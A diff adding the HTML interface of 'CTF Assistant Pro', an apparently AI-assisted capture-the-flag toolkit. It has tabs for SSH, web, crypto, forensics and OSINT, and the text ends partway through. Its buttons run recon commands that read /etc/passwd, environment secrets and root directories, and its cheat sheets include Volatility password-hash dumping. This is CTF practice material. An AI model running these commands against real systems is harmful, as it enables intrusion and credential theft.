@@ -1,0 +1,1387 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>CTF Assistant Pro</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@700;800&display=swap');
+:root{--bg:#080b0f;--bg2:#0d1117;--bg3:#161b22;--bg4:#1c2330;--b:#21293a;--b2:#2d3a50;
+--g:#00ff88;--g2:#00cc6a;--gbg:#001a0d;--r:#ff4455;--rbg:#1a0008;
+--a:#ffaa00;--abg:#1a0e00;--bl:#4488ff;--blbg:#00081a;--cy:#00ddff;--cybg:#00101a;
+--pk:#ff66cc;--pkbg:#1a0011;--t:#c8d4e0;--t2:#7a8fa8;--t3:#4a5a6a;
+--fm:'JetBrains Mono',monospace;--fd:'Syne',sans-serif;}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--t);font-family:var(--fm);font-size:12px;height:100vh;overflow:hidden;display:flex;flex-direction:column}
+/* scrollbar */
+::-webkit-scrollbar{width:5px;height:5px}::-webkit-scrollbar-track{background:var(--bg2)}::-webkit-scrollbar-thumb{background:var(--b2);border-radius:3px}
+/* header */
+.hdr{background:var(--bg2);border-bottom:1px solid var(--b);padding:8px 16px;display:flex;align-items:center;gap:12px;flex-shrink:0}
+.logo{font-family:var(--fd);font-size:17px;font-weight:800;color:var(--g);display:flex;align-items:center;gap:7px}
+.dot{width:7px;height:7px;border-radius:50%;background:var(--g);box-shadow:0 0 7px var(--g);animation:pl 2s infinite}
+@keyframes pl{0%,100%{opacity:1}50%{opacity:.3}}
+.hdr-r{margin-left:auto;font-size:10px;color:var(--t3);display:flex;gap:12px;align-items:center}
+/* tabs */
+.tabs{background:var(--bg2);border-bottom:1px solid var(--b);display:flex;padding:0 14px;flex-shrink:0;overflow-x:auto}
+.tab{padding:9px 14px;font-size:10px;cursor:pointer;color:var(--t3);border-bottom:2px solid transparent;white-space:nowrap;letter-spacing:.06em;text-transform:uppercase;transition:all .15s}
+.tab:hover{color:var(--t2)}.tab.on{color:var(--g);border-bottom-color:var(--g)}
+/* layout */
+.main{display:flex;flex:1;min-height:0}
+/* sidebar */
+.sb{width:185px;background:var(--bg2);border-right:1px solid var(--b);overflow-y:auto;flex-shrink:0}
+.sb-s{padding:8px 10px;border-bottom:1px solid var(--b)}
+.sb-lbl{font-size:9px;color:var(--t3);text-transform:uppercase;letter-spacing:.1em;margin-bottom:5px}
+.sb-btn{width:100%;text-align:left;background:transparent;border:1px solid transparent;color:var(--t2);font-family:var(--fm);font-size:10px;padding:4px 7px;border-radius:3px;cursor:pointer;transition:all .1s;display:flex;align-items:center;gap:5px;margin-bottom:1px}
+.sb-btn:hover{background:var(--bg3);border-color:var(--b);color:var(--t)}
+.sb-btn.on{background:var(--gbg);border-color:var(--g2);color:var(--g)}
+/* panel */
+.panel{flex:1;display:flex;flex-direction:column;min-width:0;overflow:hidden}
+.tc{display:none;flex:1;flex-direction:column;min-height:0;overflow:hidden}.tc.on{display:flex}
+/* common inputs */
+input.fi,textarea.fi,select.fi{background:var(--bg);border:1px solid var(--b2);border-radius:4px;color:var(--t);font-family:var(--fm);font-size:11px;padding:6px 9px;outline:none}
+input.fi:focus,textarea.fi:focus,select.fi:focus{border-color:var(--g2)}
+textarea.fi{resize:vertical}
+/* buttons */
+.btn{font-family:var(--fm);font-size:11px;padding:6px 13px;border-radius:4px;cursor:pointer;border:1px solid;transition:all .12s}
+.bg{background:var(--gbg);border-color:var(--g2);color:var(--g)}.bg:hover{background:#003020}
+.br{background:var(--rbg);border-color:#aa2233;color:var(--r)}.br:hover{background:#2a0008}
+.bb{background:var(--blbg);border-color:#224488;color:var(--bl)}.bb:hover{background:#001030}
+.ba{background:var(--abg);border-color:#886600;color:var(--a)}.ba:hover{background:#2a1800}
+.bc{background:var(--cybg);border-color:#006688;color:var(--cy)}.bc:hover{background:#001822}
+.bp{background:var(--pkbg);border-color:#882266;color:var(--pk)}.bp:hover{background:#2a0018}
+.btn-sm{font-size:10px;padding:3px 9px}
+/* section */
+.sec{background:var(--bg3);border:1px solid var(--b);border-radius:5px;padding:12px}
+.sec-t{font-size:9px;color:var(--t3);text-transform:uppercase;letter-spacing:.1em;margin-bottom:8px}
+/* scrollable content area */
+.scroll{overflow-y:auto;flex:1;padding:14px 16px;display:flex;flex-direction:column;gap:12px}
+/* row/grid helpers */
+.row{display:flex;gap:8px;align-items:flex-start;flex-wrap:wrap}
+.col{display:flex;flex-direction:column;gap:6px}
+.g2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.g3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px}
+/* output box */
+.out{background:#050709;border:1px solid var(--b);border-radius:4px;padding:9px;font-size:11px;white-space:pre-wrap;word-break:break-all;color:#8ec4a0;overflow-y:auto}
+.out.tall{min-height:80px;max-height:260px}
+.out.sm{max-height:120px}
+pre.code{background:#050709;border:1px solid var(--b2);border-radius:4px;padding:9px;font-size:10px;overflow-x:auto;white-space:pre-wrap;word-break:break-all;color:#a8c4e0;line-height:1.5;max-height:220px}
+/* chat */
+.chat-msgs{flex:1;overflow-y:auto;padding:14px 16px;display:flex;flex-direction:column;gap:12px}
+.msg{display:flex;flex-direction:column;gap:3px}
+.msg-h{font-size:9px;color:var(--t3);display:flex;align-items:center;gap:5px}
+.bdg{padding:1px 6px;border-radius:2px;font-size:9px;letter-spacing:.04em}
+.bai{background:var(--gbg);color:var(--g);border:1px solid var(--g2)}
+.bme{background:var(--blbg);color:var(--bl);border:1px solid #224488}
+.bubble{padding:9px 12px;border-radius:0 5px 5px 5px;border:1px solid var(--b);background:var(--bg3);line-height:1.65;max-width:94%;word-break:break-word}
+.msg.me{align-items:flex-end}.msg.me .bubble{border-radius:5px 0 5px 5px;background:var(--bg4);border-color:var(--b2)}
+.flag-hit{background:var(--gbg);border:1px solid var(--g);border-radius:3px;padding:5px 10px;color:var(--g);font-size:11px;margin:3px 0;font-weight:700}
+.tp{display:flex;gap:4px;align-items:center;padding:6px 0}
+.tp span{width:5px;height:5px;border-radius:50%;background:var(--g);opacity:.2;animation:bk 1.2s infinite}
+.tp span:nth-child(2){animation-delay:.2s}.tp span:nth-child(3){animation-delay:.4s}
+@keyframes bk{0%,80%,100%{opacity:.2}40%{opacity:1}}
+.chat-in{padding:10px 14px;border-top:1px solid var(--b);background:var(--bg2);display:flex;gap:8px;align-items:flex-end;flex-shrink:0}
+#chatTa{flex:1;min-height:38px;max-height:100px;line-height:1.4}
+/* terminal */
+.term{background:#040608;border:1px solid var(--b);border-radius:4px}
+.term-bar{background:var(--bg3);padding:5px 10px;border-bottom:1px solid var(--b);display:flex;align-items:center;gap:7px;font-size:9px;color:var(--t3)}
+.term-out{padding:10px;max-height:300px;overflow-y:auto;color:#8ec4a0;white-space:pre-wrap;word-break:break-all;font-size:11px;line-height:1.5}
+.term-in{display:flex;align-items:center;border-top:1px solid var(--b)}
+.tp2{padding:6px 8px;color:var(--g);font-size:11px;white-space:nowrap}
+input#tCmd{flex:1;background:transparent;border:none;color:var(--t);font-family:var(--fm);font-size:11px;padding:6px 4px;outline:none}
+.trn{background:var(--gbg);border:none;border-left:1px solid var(--b);color:var(--g);font-family:var(--fm);font-size:10px;padding:6px 10px;cursor:pointer}
+/* kv table */
+.kv{width:100%;border-collapse:collapse;font-size:11px}
+.kv td{padding:3px 6px;border-bottom:1px solid var(--b);vertical-align:top}
+.kv td:first-child{color:var(--t3);width:160px;word-break:break-all}
+.kv td:last-child{color:var(--t);word-break:break-all}
+/* tags */
+.tag{display:inline-block;padding:2px 7px;border-radius:3px;font-size:10px;margin:2px}
+.tag-g{background:var(--gbg);color:var(--g);border:1px solid var(--g2)}
+.tag-a{background:var(--abg);color:var(--a);border:1px solid #664400}
+.tag-b{background:var(--blbg);color:var(--bl);border:1px solid #224488}
+.tag-r{background:var(--rbg);color:var(--r);border:1px solid #882233}
+.tag-p{background:var(--pkbg);color:var(--pk);border:1px solid #882266}
+.tag-c{background:var(--cybg);color:var(--cy);border:1px solid #006688}
+/* payload list */
+.plist{list-style:none;max-height:180px;overflow-y:auto}
+.plist li{padding:4px 8px;font-size:10px;cursor:pointer;border-radius:3px;color:var(--t2);border:1px solid transparent;margin-bottom:1px;transition:all .1s}
+.plist li:hover{background:var(--bg4);border-color:var(--b2);color:var(--t)}
+.plist li.flag-pl{color:var(--g);border-color:var(--gbg)}
+/* status */
+.status{font-size:10px;padding:2px 8px;border-radius:3px;display:inline-block}
+.s200{background:var(--gbg);color:var(--g)}.s300{background:var(--abg);color:var(--a)}
+.s400{background:var(--rbg);color:var(--r)}.s500{background:var(--rbg);color:var(--r)}
+/* quick btns row */
+.qrow{display:flex;flex-wrap:wrap;gap:5px;padding:8px 14px;border-bottom:1px solid var(--b);background:var(--bg2);flex-shrink:0}
+.qb{font-family:var(--fm);font-size:9px;padding:3px 8px;border-radius:3px;cursor:pointer;border:1px solid var(--b2);background:transparent;color:var(--t2);transition:all .1s}
+.qb:hover{background:var(--bg3);color:var(--t)}
+/* two-pane */
+.tpane{display:grid;grid-template-columns:1fr 1fr;gap:10px;flex:1;min-height:0;padding:12px;overflow:hidden}
+.tpane > .col{overflow-y:auto}
+/* wide input row */
+.wi{display:flex;gap:8px;width:100%}.wi input,.wi select{flex:1}
+</style>
+</head>
+<body>
+<div class="hdr">
+  <div class="logo"><div class="dot"></div>CTF<span style="color:var(--t2);font-weight:400">assistant</span><span style="background:var(--r);color:#fff;font-size:9px;padding:2px 6px;border-radius:2px;font-family:var(--fm)">PRO</span></div>
+  <div style="font-size:9px;color:var(--t3)">// all categories · local · AI-powered</div>
+  <div class="hdr-r"><span style="color:var(--g);font-size:9px" id="apiSt">● online</span><span>localhost:5000</span></div>
+</div>
+
+<div class="tabs" id="tabBar">
+  <div class="tab on" onclick="sw('chat')">🤖 AI Chat</div>
+  <div class="tab" onclick="sw('ssh')">⚡ SSH</div>
+  <div class="tab" onclick="sw('web')">🌐 Web</div>
+  <div class="tab" onclick="sw('crypto')">🔐 Crypto</div>
+  <div class="tab" onclick="sw('forensics')">🔬 Forensics</div>
+  <div class="tab" onclick="sw('osint')">🕵️ OSINT</div>
+  <div class="tab" onclick="sw('stego')">🖼️ Stego</div>
+  <div class="tab" onclick="sw('net')">📡 Network</div>
+  <div class="tab" onclick="sw('misc')">🎲 Misc</div>
+  <div class="tab" onclick="sw('scripts')">📜 Scripts</div>
+</div>
+
+<div class="main">
+<!-- ══════════════════ SIDEBAR ══════════════════ -->
+<div class="sb">
+  <div class="sb-s">
+    <div class="sb-lbl">Category</div>
+    <button class="sb-btn on" onclick="setCat(this,'auto')">🔍 auto-detect</button>
+    <button class="sb-btn" onclick="setCat(this,'web')">🌐 web</button>
+    <button class="sb-btn" onclick="setCat(this,'crypto')">🔐 cryptography</button>
+    <button class="sb-btn" onclick="setCat(this,'forensics')">🔬 forensics</button>
+    <button class="sb-btn" onclick="setCat(this,'pwn')">💣 pwn/binary</button>
+    <button class="sb-btn" onclick="setCat(this,'reverse')">⚙️ reverse eng</button>
+    <button class="sb-btn" onclick="setCat(this,'osint')">🕵️ osint</button>
+    <button class="sb-btn" onclick="setCat(this,'stego')">🖼️ steganography</button>
+    <button class="sb-btn" onclick="setCat(this,'net')">📡 networking</button>
+    <button class="sb-btn" onclick="setCat(this,'misc')">🎲 misc/logic</button>
+  </div>
+  <div class="sb-s">
+    <div class="sb-lbl">Quick inject</div>
+    <button class="sb-btn" onclick="inj('Decode this: ')">decode this</button>
+    <button class="sb-btn" onclick="inj('RSA: n=\ne=\nc=\nFind the flag.')">RSA attack</button>
+    <button class="sb-btn" onclick="inj('JWT token:\n\nFind vulnerabilities and the flag.')">JWT attack</button>
+    <button class="sb-btn" onclick="inj('SQLi target: \nParameter: \nFind the flag.')">SQL injection</button>
+    <button class="sb-btn" onclick="inj('LFI param: \nBase URL: \nFind readable files.')">LFI scan</button>
+    <button class="sb-btn" onclick="inj('SSTI template injection in:\nFind flag.')">SSTI</button>
+    <button class="sb-btn" onclick="inj('Reverse this binary / code:\n')">reverse eng</button>
+    <button class="sb-btn" onclick="inj('Write pwntools exploit:\n')">pwntools</button>
+    <button class="sb-btn" onclick="inj('Write z3 solver:\n')">z3 solver</button>
+    <button class="sb-btn" onclick="inj('OSINT on target: \nFind flag or info.')">osint</button>
+    <button class="sb-btn" onclick="inj('Analyze this PCAP/network data:\n')">pcap analysis</button>
+  </div>
+  <div class="sb-s">
+    <div class="sb-lbl">Common flags</div>
+    <button class="sb-btn" onclick="inj('Challenge uses flag{...} format')">flag{...}</button>
+    <button class="sb-btn" onclick="inj('Challenge uses CTF{...} format')">CTF{...}</button>
+    <button class="sb-btn" onclick="inj('Challenge uses picoCTF{...} format')">picoCTF{...}</button>
+    <button class="sb-btn" onclick="inj('Challenge uses HTB{...} format')">HTB{...}</button>
+  </div>
+</div>
+
+<!-- ══════════════════ PANEL ══════════════════ -->
+<div class="panel">
+
+<!-- ─── AI CHAT ─── -->
+<div class="tc on" id="tc-chat">
+  <div class="qrow">
+    <span style="font-size:9px;color:var(--t3);line-height:20px">AI:</span>
+    <select class="fi" id="aiProvider" style="font-size:10px;padding:3px 8px;min-width:120px;background:var(--bg);border-color:var(--b2)" title="Choose AI provider">
+      <option value="anthropic">🟣 Anthropic (Claude)</option>
+      <option value="openai">🟢 OpenAI (GPT-4o)</option>
+      <option value="gemini">🔵 Gemini (2.5 Flash)</option>
+    </select>
+    <span style="width:1px;height:16px;background:var(--b2);margin:0 4px"></span>
+    <span style="font-size:9px;color:var(--t3);line-height:20px">Quick:</span>
+    <button class="qb" onclick="inj('Identify the encoding/cipher and decode: ')">identify+decode</button>
+    <button class="qb" onclick="inj('Find vulnerabilities and write exploit for:\n')">find vuln</button>
+    <button class="qb" onclick="inj('This is a web challenge. URL: \nAnalyze and find the flag.')">web challenge</button>
+    <button class="qb" onclick="inj('Crack this hash: ')">crack hash</button>
+    <button class="qb" onclick="inj('Analyze this source code for vulnerabilities:\n')">code review</button>
+    <button class="qb" onclick="inj('Generate all possible flag formats from: ')">gen flags</button>
+    <button class="qb" onclick="inj('Write a Python script to brute-force: ')">brute force</button>
+    <button class="qb" onclick="inj('Analyze this steganography challenge:\n')">stego hint</button>
+    <button class="qb" onclick="inj('This regex/logic puzzle:\n')">logic puzzle</button>
+  </div>
+  <div class="chat-msgs" id="chatBox">
+    <div class="msg">
+      <div class="msg-h"><span class="bdg bai">CTF-AI</span></div>
+      <div class="bubble">🚩 <strong>CTF Assistant Pro — all categories loaded.</strong><br><br>
+Paste <em>anything</em>: challenge description, ciphertext, source code, SSH output, URLs, binary data, hex, base64.<br><br>
+I'll identify the attack vector, decode inline, and write complete exploit scripts.<br><br>
+<span style="color:var(--t3)">← Use tabs for specialized tools: Web, Crypto, Forensics, OSINT, Stego, Network, Misc</span></div>
+    </div>
+  </div>
+  <div class="chat-in">
+    <textarea class="fi" id="chatTa" placeholder="Paste challenge text, ciphertext, URL, code, hex, base64, SSH output..." onkeydown="ck(event)" rows="2"></textarea>
+    <button class="btn bg" id="sendBtn" onclick="doChat()">send ↗</button>
+  </div>
+</div>
+
+<!-- ─── SSH ─── -->
+<div class="tc" id="tc-ssh">
+  <div class="scroll">
+    <div class="sec">
+      <div class="sec-t">SSH Connection</div>
+      <div class="row" style="margin-bottom:8px">
+        <div class="col"><label style="font-size:9px;color:var(--t3)">HOST</label><input class="fi" id="sH" placeholder="ctf.example.com" style="width:180px"></div>
+        <div class="col"><label style="font-size:9px;color:var(--t3)">PORT</label><input class="fi" id="sP" value="22" style="width:55px"></div>
+        <div class="col"><label style="font-size:9px;color:var(--t3)">USER</label><input class="fi" id="sU" value="ctf" style="width:80px"></div>
+        <div class="col"><label style="font-size:9px;color:var(--t3)">PASSWORD</label><input class="fi" id="sPw" type="password" placeholder="password" style="width:140px"></div>
+      </div>
+      <div class="row"><button class="btn bg" onclick="sConn()">connect</button><button class="btn br" onclick="sDisc()">disconnect</button><span id="ssSt" style="font-size:10px;color:var(--t3)">● not connected</span></div>
+    </div>
+    <div>
+      <div class="sec-t" style="padding:0 0 6px">Quick recon</div>
+      <div style="display:flex;flex-wrap:wrap;gap:4px">
+        <button class="btn bb btn-sm" onclick="rc('id && whoami')">whoami</button>
+        <button class="btn bb btn-sm" onclick="rc('ls -la')">ls -la</button>
+        <button class="btn bb btn-sm" onclick="rc('cat /etc/passwd')">passwd</button>
+        <button class="btn bb btn-sm" onclick="rc('find / -name \"flag*\" 2>/dev/null | head -20')">find flags</button>
+        <button class="btn bb btn-sm" onclick="rc('find / -name \"*.txt\" 2>/dev/null | xargs grep -l flag 2>/dev/null | head -10')">grep flags</button>
+        <button class="btn bb btn-sm" onclick="rc('find / -perm -4000 2>/dev/null')">SUID bins</button>
+        <button class="btn bb btn-sm" onclick="rc('sudo -l')">sudo -l</button>
+        <button class="btn bb btn-sm" onclick="rc('env && cat /proc/self/environ 2>/dev/null')">env vars</button>
+        <button class="btn bb btn-sm" onclick="rc('crontab -l && cat /etc/crontab')">crontab</button>
+        <button class="btn bb btn-sm" onclick="rc('ps aux')">processes</button>
+        <button class="btn bb btn-sm" onclick="rc('ss -tuln 2>/dev/null || netstat -tuln')">open ports</button>
+        <button class="btn bb btn-sm" onclick="rc('getcap -r / 2>/dev/null')">capabilities</button>
+        <button class="btn bb btn-sm" onclick="rc('ls -la /home/ && ls -la /root/ 2>/dev/null')">home dirs</button>
+        <button class="btn bb btn-sm" onclick="rc('cat /var/www/html/*.php 2>/dev/null | head -100')">web files</button>
+        <button class="btn bb btn-sm" onclick="rc('history')">history</button>
+        <button class="btn bb btn-sm" onclick="rc('ls -la /var/backups/ && ls -la /tmp/')">backups</button>
+        <button class="btn ba btn-sm" onclick="ssAI()">analyze with AI ↗</button>
+      </div>
+    </div>
+    <div class="term">
+      <div class="term-bar"><span style="color:var(--g)">●</span>terminal<button class="btn ba btn-sm" style="margin-left:auto;font-size:9px;padding:2px 7px" onclick="ssAI()">→ AI</button></div>
+      <div class="term-out" id="tOut">// connect to begin\n</div>
+      <div class="term-in">
+        <span class="tp2">$</span>
+        <input id="tCmd" placeholder="command..." onkeydown="if(event.key==='Enter')rc(this.value)">
+        <button class="trn" onclick="rc(document.getElementById('tCmd').value)">run</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ─── WEB ─── -->
+<div class="tc" id="tc-web">
+  <div class="scroll">
+    <!-- Deep probe -->
+    <div class="sec">
+      <div class="sec-t">Deep URL probe — auto-scans headers, comments, forms, hidden paths</div>
+      <div class="row" style="margin-bottom:8px"><input class="fi" id="pUrl" placeholder="https://ctf.example.com/challenge" style="flex:1"><button class="btn bg" onclick="probe()">deep scan ↗</button><button class="btn ba" onclick="pAI()">→ AI</button></div>
+      <div id="pRes"></div>
+    </div>
+    <!-- Custom request -->
+    <div class="sec">
+      <div class="sec-t">Custom HTTP request</div>
+      <div class="row" style="margin-bottom:7px">
+        <select class="fi" id="rMeth" style="width:85px"><option>GET</option><option>POST</option><option>PUT</option><option>DELETE</option><option>PATCH</option><option>OPTIONS</option><option>HEAD</option></select>
+        <input class="fi" id="rUrl" placeholder="https://..." style="flex:1">
+        <button class="btn bg" onclick="doReq()">send</button>
+        <button class="btn ba" onclick="rAI()">→ AI</button>
+      </div>
+      <div class="g2" style="margin-bottom:7px">
+        <div class="col"><div style="font-size:9px;color:var(--t3);margin-bottom:3px">HEADERS (JSON)</div>
+          <textarea class="fi" id="rHdr" style="min-height:60px" placeholder='{"Cookie":"session=abc","Authorization":"Bearer eyJ..."}'></textarea></div>
+        <div class="col"><div style="font-size:9px;color:var(--t3);margin-bottom:3px">BODY / PAYLOAD</div>
+          <textarea class="fi" id="rBody" style="min-height:60px" placeholder="POST data, JSON, SQL payload..."></textarea></div>
+      </div>
+      <div class="row">
+        <button class="qb" onclick="setPayload('sqli')">SQLi payloads</button>
+        <button class="qb" onclick="setPayload('xss')">XSS payloads</button>
+        <button class="qb" onclick="setPayload('ssti')">SSTI payloads</button>
+        <button class="qb" onclick="setPayload('lfi')">LFI paths</button>
+        <button class="qb" onclick="setPayload('xxe')">XXE payload</button>
+        <button class="qb" onclick="setPayload('cmd')">cmd injection</button>
+        <button class="qb" onclick="setPayload('jwt_none')">JWT alg:none</button>
+      </div>
+      <div id="rRes" style="margin-top:8px"></div>
+    </div>
+    <!-- JWT analyzer -->
+    <div class="sec">
+      <div class="sec-t">JWT analyzer & attacker</div>
+      <div class="row"><input class="fi" id="jwtIn" placeholder="eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.xxx" style="flex:1"><button class="btn bc" onclick="analyzeJWT()">analyze</button></div>
+      <div id="jwtRes" style="margin-top:8px"></div>
+    </div>
+    <!-- SQLi helper -->
+    <div class="sec">
+      <div class="sec-t">SQL injection payloads generator</div>
+      <div class="row" style="margin-bottom:7px">
+        <input class="fi" id="sqliUrl" placeholder="http://target.com/page.php" style="flex:1">
+        <input class="fi" id="sqliParam" placeholder="id" style="width:70px">
+        <select class="fi" id="sqliDb" style="width:80px"><option>mysql</option><option>postgres</option><option>sqlite</option><option>mssql</option></select>
+        <button class="btn bc" onclick="doSQLi()">generate</button>
+      </div>
+      <div id="sqliRes"></div>
+    </div>
+    <!-- LFI -->
+    <div class="sec">
+      <div class="sec-t">LFI / Path traversal payloads</div>
+      <div class="row"><input class="fi" id="lfiParam" placeholder="page" style="width:100px"><button class="btn bc" onclick="doLFI()">get payloads</button></div>
+      <div id="lfiRes" style="margin-top:8px"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ─── CRYPTO ─── -->
+<div class="tc" id="tc-crypto">
+  <div class="scroll">
+    <!-- Universal decoder -->
+    <div class="sec">
+      <div class="sec-t">Universal decoder / encoder</div>
+      <textarea class="fi" id="decIn" style="width:100%;min-height:70px;margin-bottom:7px" placeholder="paste any encoded text..."></textarea>
+      <div class="row" style="margin-bottom:7px">
+        <select class="fi" id="decMode" style="width:200px" onchange="showExtra()">
+          <option value="b64d">base64 decode</option><option value="b64e">base64 encode</option>
+          <option value="b32d">base32 decode</option><option value="b32e">base32 encode</option>
+          <option value="b16d">hex decode (text)</option><option value="b16e">text → hex</option>
+          <option value="rot13">ROT13</option><option value="allrot">all ROT (brute force)</option>
+          <option value="caesar">Caesar cipher</option><option value="atbash">Atbash</option>
+          <option value="vigenere">Vigenere decrypt</option><option value="bacon">Bacon cipher</option>
+          <option value="railfence">Rail fence</option><option value="morse">Morse code</option>
+          <option value="bin">binary → text</option><option value="oct">octal → text</option>
+          <option value="bytes">decimal bytes → text</option><option value="xor">XOR (char input)</option>
+          <option value="xor_hex">XOR hex (hex input)</option>
+          <option value="b64_chain">base64 chain decode</option>
+          <option value="urld">URL decode</option><option value="urle">URL encode</option>
+          <option value="html">HTML entity decode</option>
+          <option value="unicode">Unicode escape decode</option>
+          <option value="rev">reverse</option>
+        </select>
+        <input class="fi" id="decExtra" placeholder="key/shift" style="width:80px" title="key for XOR/Vigenere, shift for Caesar, rails for Rail fence">
+        <button class="btn bc" onclick="doDecode()">decode</button>
+        <button class="btn ba" onclick="decAI()">→ AI</button>
+        <button class="btn bg btn-sm" onclick="copyEl('decOut')">copy</button>
+      </div>
+      <div class="out tall" id="decOut"></div>
+    </div>
+    <!-- RSA -->
+    <div class="sec">
+      <div class="sec-t">RSA attacker</div>
+      <div class="g2" style="margin-bottom:7px">
+        <div class="col"><label style="font-size:9px;color:var(--t3)">n (modulus)</label><textarea class="fi" id="rsaN" style="min-height:50px" placeholder="large number..."></textarea></div>
+        <div class="col"><label style="font-size:9px;color:var(--t3)">e (exponent)</label><input class="fi" id="rsaE" value="65537"></div>
+      </div>
+      <div class="g2" style="margin-bottom:7px">
+        <div class="col"><label style="font-size:9px;color:var(--t3)">c (ciphertext)</label><textarea class="fi" id="rsaC" style="min-height:50px" placeholder="integer..."></textarea></div>
+        <div class="col">
+          <label style="font-size:9px;color:var(--t3)">p (if known)</label><input class="fi" id="rsaP" placeholder="prime factor" style="margin-bottom:4px">
+          <label style="font-size:9px;color:var(--t3)">q (if known)</label><input class="fi" id="rsaQ" placeholder="prime factor">
+        </div>
+      </div>
+      <div class="row"><button class="btn bc" onclick="doRSA()">analyze & attack</button><button class="btn ba" onclick="rsaAI()">→ AI with script</button></div>
+      <div id="rsaRes" style="margin-top:8px"></div>
+    </div>
+    <!-- XOR brute -->
+    <div class="sec">
+      <div class="sec-t">XOR single-byte brute force</div>
+      <div class="row" style="margin-bottom:7px"><textarea class="fi" id="xorIn" style="flex:1;min-height:45px" placeholder="hex-encoded ciphertext (e.g. 1a2b3c4d...)"></textarea><button class="btn bc" onclick="doXor()">brute all keys</button></div>
+      <div class="out tall" id="xorOut"></div>
+    </div>
+    <!-- Hash -->
+    <div class="sec">
+      <div class="sec-t">Hash identifier & cracker hints</div>
+      <div class="row" style="margin-bottom:7px"><input class="fi" id="hashIn" placeholder="paste hash..." style="flex:1"><button class="btn bc" onclick="doHash()">identify</button></div>
+      <div id="hashRes"></div>
+    </div>
+    <!-- Freq analysis -->
+    <div class="sec">
+      <div class="sec-t">Frequency analysis (substitution cipher helper)</div>
+      <div class="row" style="margin-bottom:7px"><textarea class="fi" id="freqIn" style="flex:1;min-height:45px" placeholder="ciphertext..."></textarea><button class="btn bc" onclick="doFreq()">analyze</button></div>
+      <div class="out sm" id="freqOut"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ─── FORENSICS ─── -->
+<div class="tc" id="tc-forensics">
+  <div class="scroll">
+    <div class="sec">
+      <div class="sec-t">File type analyzer & tool recommender</div>
+      <div class="row" style="margin-bottom:7px">
+        <input class="fi" id="fName" placeholder="filename.jpg (or paste hex below)" style="flex:1">
+        <button class="btn bc" onclick="doForensics()">analyze</button>
+        <button class="btn ba" onclick="fAI()">→ AI</button>
+      </div>
+      <div class="col" style="margin-bottom:7px">
+        <label style="font-size:9px;color:var(--t3)">Or paste file content (base64 or hex for magic byte detection)</label>
+        <textarea class="fi" id="fContent" style="min-height:50px" placeholder="base64 or hex content..."></textarea>
+      </div>
+      <div id="fRes"></div>
+    </div>
+    <!-- PCAP filter cheatsheet -->
+    <div class="sec">
+      <div class="sec-t">Wireshark / tshark filters cheatsheet</div>
+      <div class="out" style="max-height:200px;font-size:10px">tshark -r cap.pcap -Y 'http'
+tshark -r cap.pcap -Y 'http.request.method==POST' -T fields -e http.file_data
+tshark -r cap.pcap -Y 'dns' -T fields -e dns.qry.name
+tshark -r cap.pcap -Y 'ftp or ftp-data'
+tshark -r cap.pcap -Y 'tcp contains "flag"'
+tshark -r cap.pcap -Y 'smtp' -T fields -e smtp.req.parameter
+tshark -r cap.pcap -T fields -e ip.src -e ip.dst -e tcp.dstport | sort | uniq -c | sort -rn
+# Follow stream: tshark -r cap.pcap -q -z follow,tcp,ascii,0
+# Extract files: tshark -r cap.pcap --export-objects http,./extracted/
+# NetworkMiner: GUI tool for file carving from PCAP</div>
+    </div>
+    <!-- Volatility -->
+    <div class="sec">
+      <div class="sec-t">Volatility memory forensics commands</div>
+      <div class="out" style="max-height:200px;font-size:10px">vol.py -f mem.raw imageinfo
+vol.py -f mem.raw --profile=Win7SP1x64 pslist
+vol.py -f mem.raw --profile=Win7SP1x64 filescan | grep -i flag
+vol.py -f mem.raw --profile=Win7SP1x64 cmdline
+vol.py -f mem.raw --profile=Win7SP1x64 dumpfiles -Q 0x... -D ./
+vol.py -f mem.raw --profile=Win7SP1x64 hivelist
+vol.py -f mem.raw --profile=Win7SP1x64 hashdump
+vol.py -f mem.raw --profile=Win7SP1x64 envars | grep -i flag
+# Linux memory:
+vol.py -f mem.raw --profile=LinuxUbuntu1604x64 linux_bash
+vol.py -f mem.raw --profile=LinuxUbuntu1604x64 linux_find_file -F /etc/passwd</div>
+    </div>
+    <!-- Binwalk / strings -->
+    <div class="sec">
+      <div class="sec-t">File carving commands</div>
+      <div class="out" style="max-height:160px;font-size:10px">binwalk -e suspicious_file        # extract embedded files
+binwalk --dd='.*' suspicious_file  # extract everything
+foremost -i suspicious_file        # carve by file signatures
+strings suspicious_file | grep -i flag
+strings suspicious_file | grep -E '[a-zA-Z0-9_]{2,10}\{[^}]+\}'
+xxd suspicious_file | head -30     # check magic bytes
+hexdump -C suspicious_file | head -30
+file suspicious_file               # detect true type
+exiftool suspicious_file           # metadata
+# Detect hidden zip: look for PK\x03\x04 in hexdump
+# Detect hidden PNG: look for \x89PNG in hexdump</div>
+    </div>
+  </div>
+</div>
+
+<!-- ─── OSINT ─── -->
+<div class="tc" id="tc-osint">
+  <div class="scroll">
+    <div class="sec">
+      <div class="sec-t">DNS enumeration</div>
+      <div class="row" style="margin-bottom:7px"><input class="fi" id="dnsD" placeholder="target.com" style="flex:1"><button class="btn bc" onclick="doDNS()">enumerate</button></div>
+      <div id="dnsRes"></div>
+    </div>
+    <div class="sec">
+      <div class="sec-t">Google dork generator</div>
+      <div class="row" style="margin-bottom:7px"><input class="fi" id="dorkT" placeholder="target.com or keyword" style="flex:1"><button class="btn bc" onclick="doDorks()">generate dorks</button></div>
+      <div id="dorkRes"></div>
+    </div>
+    <div class="sec">
+      <div class="sec-t">OSINT resources & links</div>
+      <div style="display:flex;flex-wrap:wrap;gap:5px">
+        <a href="https://crt.sh" target="_blank" class="tag tag-b" style="text-decoration:none">crt.sh (SSL certs)</a>
+        <a href="https://web.archive.org" target="_blank" class="tag tag-b" style="text-decoration:none">Wayback Machine</a>
+        <a href="https://shodan.io" target="_blank" class="tag tag-b" style="text-decoration:none">Shodan</a>
